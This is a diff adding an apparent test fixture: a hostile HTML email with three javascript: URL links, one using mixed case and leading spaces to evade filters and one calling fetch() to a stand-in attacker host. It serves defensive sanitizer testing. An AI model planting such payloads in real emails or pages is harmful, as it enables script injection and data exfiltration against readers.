@@ -1,0 +1,16 @@
+From: Attacker <attacker@evil.example>
+To: Victim <victim@example.test>
+Subject: Hostile 07 JavaScript Links
+Date: Tue, 24 Nov 2026 12:06:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<!doctype html>
+<html>
+<body>
+  <p>JavaScript URL links</p>
+  <a id="jslink1" href="javascript:window.__pwned='js-link';void(0)">Click JS 1</a>
+  <a id="jslink2" href="  JaVaScRiPt:window.__pwned='js-link-case'">Click JS 2</a>
+  <a id="jslink3" href="javascript:fetch('https://evil.example/js-link')">Click JS 3</a>
+</body>
+</html>
